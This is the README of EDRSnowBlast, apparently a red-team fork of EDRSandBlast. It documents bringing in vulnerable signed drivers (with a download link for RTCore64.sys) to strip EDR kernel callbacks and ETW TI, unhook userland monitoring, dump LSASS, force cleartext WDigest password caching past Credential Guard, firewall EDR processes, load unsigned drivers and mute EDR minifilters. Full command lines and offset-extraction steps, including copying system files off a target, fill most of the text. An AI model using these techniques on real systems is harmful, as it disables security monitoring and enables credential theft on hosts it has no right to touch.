# EDRSnowBlast
**`EDRSnowBlast`** is a fork of `EDRSandBlast` project [https://github.com/wavestone-cdt/EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast) from [Thomas DIOT (Qazeer)](https://github.com/Qazeer/) and [Maxime MEIGNAN (themaks)](https://github.com/themaks)

# EDRSnowblast

## Description  

**`EDRSnowBlast`** is a fork of `EDRSandBlast` project [https://github.com/wavestone-cdt/EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast) from [Thomas DIOT (Qazeer)](https://github.com/Qazeer/) and [Maxime MEIGNAN (themaks)](https://github.com/themaks)

[`EDRSandBlast` is a tool written in `C` that weaponize a vulnerable signed
driver to bypass EDR detections (Notify Routine callbacks, Object Callbacks
and `ETW TI` provider) and `LSASS` protections. Multiple userland unhooking
techniques are also implemented to evade userland monitoring.]


  
**`EDRSnowBlast`** has the following differences :  
- Add new Windows version validation method
- Add new driver support : GDRV.sys
- Add feature : loading unsigned kernel driver
- Add feature : loading unsigned minifilter driver
- Add feature "filter-enum" for minifilter enumeration process
- Add feature "filter-mute" for disabling messages between EDR.sys and EDR.exe
- Add new offsets files : updated ExtractOffsets.py  
  

More information on EDRSnowBlast : [https://v1k1ngfr.github.io/edrsnowblast/](https://v1k1ngfr.github.io/edrsnowblast/)  

More information on "filter-mute" : [TODO : Add dedicated blogpost](TODO)  

## Usage

The vulnerable `RTCore64.sys` driver can be retrieved at:

```
http://download-eu2.guru3d.com/afterburner/%5BGuru3D.com%5D-MSIAfterburnerSetup462Beta2.zip
```  

The vulnerable `gdrv.sys` is provided in this repository.  

### Quick usage

```
Usage: EDRSnowblast.exe [-h | --help] [-v | --verbose] <action mode> [option]
```

### Options

```
-h | --help             Show this help message and exit.
-v | --verbose          Enable a more verbose output.

Actions mode:

        audit           Display the user-land hooks and / or Kernel callbacks without taking actions.
        dump            Dump the process specified by --process-name (LSASS process by default), as '<process_name>' in the current directory or at the
                        specified file using -o | --output <DUMP_FILE>.
        cmd             Open a cmd.exe prompt.
        credguard       Patch the LSASS process' memory to enable Wdigest cleartext passwords caching even if
                        Credential Guard is enabled on the host. No kernel-land actions required.
        firewall        Add Windows firewall rules to block network access for the EDR processes / services.
        loadk           Load unsigned kernel driver. This mode implements the 'sc create [service name] [binPath=evil.sys] + sc start [service name] ' command.
        loadf           Load unsigned minifilter driver. This mode implements the 'fltmc load [ driverName ]' command.
        filter-enum     Lists all filter manager frames and attached minifilter drivers (idem Windbg !fltkd.frames).
        filter-mute     Set MaxConnections to zero for the specified driver .

--usermode              Perform user-land operations (DLL unhooking).
--kernelmode            Perform kernel-land operations (Kernel callbacks removal and ETW TI disabling).

--unhook-method <N>
   Choose the userland un-hooking technique, from the following:

        0               Do not perform any unhooking (used for direct syscalls operations).
        1 (Default)     Uses the (probably monitored) NtProtectVirtualMemory function in ntdll to remove all
                        present userland hooks.
        2               Constructs a 'unhooked' (i.e. unmonitored) version of NtProtectVirtualMemory, by
                        allocating an executable trampoline jumping over the hook, and remove all present
                        userland hooks.
        3               Searches for an existing trampoline allocated by the EDR itself, to get an 'unhooked'
                        (i.e. unmonitored) version of NtProtectVirtualMemory, and remove all present userland
                        hooks.
        4               Loads an additional version of ntdll library into memory, and use the (hopefully
                        unmonitored) version of NtProtectVirtualMemory present in this library to remove all
                        present userland hooks.
        5               Allocates a shellcode that uses a direct syscall to call NtProtectVirtualMemory,
                        and uses it to remove all detected hooks
--direct-syscalls       Use direct syscalls to conduct the specified action if possible (for now only for process dump).

Other options:

--dont-unload-driver                    Keep the vulnerable driver installed on the host
                                        Default to automatically unsinstall the driver.
--no-restore                            Do not restore the EDR drivers' Kernel Callbacks that were removed.
                                        Default to restore the callbacks.

--driver <RTCore64.sys>                 Path to the Micro-Star MSI Afterburner vulnerable driver file.
                                        Default to 'RTCore64.sys' in the current directory.
--loadk-file <evil.sys>     Require action mode "loadk". You must specify the path to the unsigned kernel driver file.
                                        Default to 'evil.sys' in the current directory.
--loadf-name <myevil>       Require action mode "loadf". You must specify the name of the unsigned minifilter driver.
                                        Default driver name is 'myevil' .
--filter-index <N>                      The filter index you want to investigate.
--service <SERVICE_NAME>                Name of the vulnerable service to intall / start.

--nt-offsets <NtoskrnlOffsets.csv>      Path to the CSV file containing the required ntoskrnl.exe's offsets.
                                        Default to 'NtoskrnlOffsets.csv' in the current directory.
--wdigest-offsets <WdigestOffsets.csv>  Path to the CSV file containing the required wdigest.dll's offsets
                                        (only for the 'credguard' mode).
                                        Default to 'WdigestOffsets.csv' in the current directory.
--ci-offsets <CiOffsets.csv>            Path to the CSV file containing the required ci.dll's offsets
                                        (only for the 'load' mode).
                                        Default to 'CiOffsets.csv' in the current directory.
--fltmgr-offsets <FltmgrOffsets.csv>    Path to the CSV file containing the required fltmgr.sys's offsets
                                        (only for the 'mute' mode).
                                        Default to 'FltmgrOffsets.csv' in the current directory.

--add-dll <dll name or path>            Loads arbitrary libraries into the process' address space, before starting
                                        anything. This can be useful to audit userland hooking for DLL that are not
                                        loaded by default by this program. Use this option multiple times to load
                                        multiple DLLs all at once.
                                        Example of interesting DLLs to look at: user32.dll, ole32.dll, crypt32.dll,
                                        samcli.dll, winhttp.dll, urlmon.dll, secur32.dll, shell32.dll...

-o | --output <DUMP_FILE>               Output path to the dump file that will be generated by the 'dump' mode.
                                        Default to 'process_name' in the current directory.
-i | --internet                         Enables automatic symbols download from Microsoft Symbol Server
                                        If a corresponding *Offsets.csv file exists, appends the downloaded offsets to the file for later use
                                        OpSec warning: downloads and drops on disk a PDB file for ntoskrnl.exe and/or wdigest.dll
```

### Build

`EDRSnowBlast` (x64 only) was built on Visual Studio 2019 (Windows SDK
Version: `10.0.19041.0` and Plateform Toolset: `Visual Studio 2019 (v142)`).

### ExtractOffsets.py usage

Note that `ExtractOffsets.py` (tested on Windows and Linux) requires [Radare2](https://rada.re/n/radare2.html) to be installed.

```
# Installation of Python dependencies
pip.exe install -m .\requirements.txt

# Script usage
usage: ExtractOffsets.py [-h] -i INPUT [-o OUTPUT] [-d] mode

positional arguments:
  mode                  ntoskrnl or wdigest or ci or fltmgr. Mode to download and extract offsets for either ntoskrnl
                        or wdigest or ci or fltmgr

options:
  -h, --help            show this help message and exit
  -i INPUT, --input INPUT
                        Single file or directory containing ntoskrnl.exe / wdigest.dll / ci.dll / fltmgr.sys to extract offsets from. If in download mode, the PE downloaded from MS symbols servers will be
                        placed in this folder.
  -o OUTPUT, --output OUTPUT
                        CSV file to write offsets to. If the specified file already exists, only new ntoskrnl versions will be downloaded / analyzed. Defaults to NtoskrnlOffsets.csv / WdigestOffsets.csv /
                        CiOffsets.csv / FltmgrOffsets.csv in the current folder.
  -d, --download        Flag to download the PE from Microsoft servers using list of versions from winbindex.m417z.com.
```

## Example : building new offsets CSV files 

You will find below the process of building offsets CSV files for a new Windows target. Don't forget to install Radare2. 

### Using external Linux host  
Note : on Kali Linux Radare2 is installed by default  

1. Exfiltrate files from your target  

```
c:\>ver
Microsoft Windows [Version 10.0.19045.3324]

c:\>mkdir z:\10.0.19045.3324
c:\>copy c:\Windows\System32\ntoskrnl.exe z:\10.0.19045.3324\
        1 file(s) copied.
c:\>copy c:\Windows\System32\wdigest.dll z:\10.0.19045.3324\
        1 file(s) copied.
c:\>copy c:\Windows\System32\ci.dll z:\10.0.19045.3324\
        1 file(s) copied.
c:\>copy c:\Windows\System32\drivers\fltMgr.sys z:\10.0.19045.3324
        1 file(s) copied.
```

2. Use python script

```
──(viking@edrsnowblast)-[/SHARE]
└─$ export R2_CURL=1

┌──(viking@edrsnowblast)-[/SHARE]
└─$ python3 ExtractOffsets.py -i 10.0.19045.3324/ntoskrnl.exe ntoskrnl
[*] Loading the known known PE versions from "NtoskrnlOffsets.csv".
[+] Loaded 7 known ntoskrnl versions from "NtoskrnlOffsets.csv"
[*] Processing ntoskrnl version ntoskrnl_19041-3324.exe (file: 10.0.19045.3324/ntoskrnl.exe)
[+] PspCreateProcessNotifyRoutine = 0xcec620
[+] PspCreateThreadNotifyRoutine = 0xcec420
[+] PspLoadImageNotifyRoutine = 0xcec220
[+] _PS_PROTECTION Protection = 0x87a
[+] EtwThreatIntProvRegHandle = 0xc19818
[+] _ETW_GUID_ENTRY* GuidEntry = 0x20
[+] _TRACE_ENABLE_INFO ProviderEnableInfo = 0x60
[+] PsProcessType = 0xcfc410
[+] PsThreadType = 0xcfc440
[+] struct _LIST_ENTRY CallbackList = 0xc8
[+] do it : 10.0.19045.3324/ntoskrnl.exe
3a7bbe1c5fe0cd115ede21a01341f9e2be30b4bdf81feb89e982de5630ce883f
[+] Finished processing of ntoskrnl 10.0.19045.3324/ntoskrnl.exe!

┌──(viking@edrsnowblast)-[/SHARE]
└─$ python3 ExtractOffsets.py -i 10.0.19045.3324/wdigest.dll wdigest
[ snip ]

└─$ python3 ExtractOffsets.py -i 10.0.19045.3324/ci.dll ci
[ snip ]

└─$ python3 ExtractOffsets.py -i 10.0.19045.3324/fltmgr.sys fltmgr
[ snip ]

```


### Directly on Windows target host
Generate offsets for a new Windows ci.dll (new file created : CiOffsets.csv)  

```
C:\Users\viking>python .\EDRSnowblast\Offsets\ExtractOffsets.py -i c:\Windows\System32\ci.dll ci
[*] Processing ci version ci_19041-3208.dll (file: c:\Windows\System32\ci.dll)
[+] g_CiOptions = 0x39418
[+] do it : c:\Windows\System32\ci.dll
e246455a03d9113c5dfd597afdd2d6f079d83b5c9bf28d20953ca3e81c1d67a0
[+] Finished processing of ci c:\Windows\System32\ci.dll!
```

Generate offsets for a new Windows kernel (new file created : NtoskrnlOffsets.csv)  

```
C:\Users\viking>python .\EDRSnowblast\Offsets\ExtractOffsets.py -i c:\Windows\System32\ntoskrnl.exe ntoskrnl
[*] Processing ntoskrnl version ntoskrnl_19041-3208.exe (file: c:\Windows\System32\ntoskrnl.exe)
[+] PspCreateProcessNotifyRoutine = 0xcec2a0
[+] PspCreateThreadNotifyRoutine = 0xcec0a0
[+] PspLoadImageNotifyRoutine = 0xcec4a0
[+] _PS_PROTECTION Protection = 0x87a
[+] EtwThreatIntProvRegHandle = 0xc19e08
[+] _ETW_GUID_ENTRY* GuidEntry = 0x20
[+] _TRACE_ENABLE_INFO ProviderEnableInfo = 0x60
[+] PsProcessType = 0xcfc410
[+] PsThreadType = 0xcfc440
[+] struct _LIST_ENTRY CallbackList = 0xc8
[+] do it : c:\Windows\System32\ntoskrnl.exe
e8e6040640c9dddc8feeb0a9310bab92e7e422ef469beabdd8b5bb63b7a9dad0
[+] Finished processing of ntoskrnl c:\Windows\System32\ntoskrnl.exe!
```

Generate offsets for a new Windows fltmgr.sys (new file created : FltmgrOffsets.csv)  

```
C:\Users\viking>python z:\EDRSnowblast\Offsets\ExtractOffsets.py -i c:\Windows\System32\drivers\fltMgr.sys fltmgr
[*] Processing fltmgr version fltmgr_19041-3086.sys (file: c:\Windows\System32\drivers\fltMgr.sys)
[+] FltGlobals = 0x29600
...
[+] do it : c:\Windows\System32\drivers\fltMgr.sys
a74ad4d7624fb741b7008711336b37f3a27d96c3ef6361c107155b3bdfd8592b
[+] Finished processing of fltmgr c:\Windows\System32\drivers\fltMgr.sys!
```

## Example : loading unsigned Windows drivers 

Here is an example of loading unsigned Windows kernel driver (CSV offset files are in the current directory) :  

```
EDRSnowblast.exe loadk --kernelmode --loadk-file C:\evil.sys --verbose
```

Here is an example of loading unsigned Windows kernel minifilter driver (Minifilter driver should already be installed and CSV offset files are in the current directory) :  

```
EDRSnowblast.exe loadf --kernelmode --loadf-name myevildriver --verbose
```

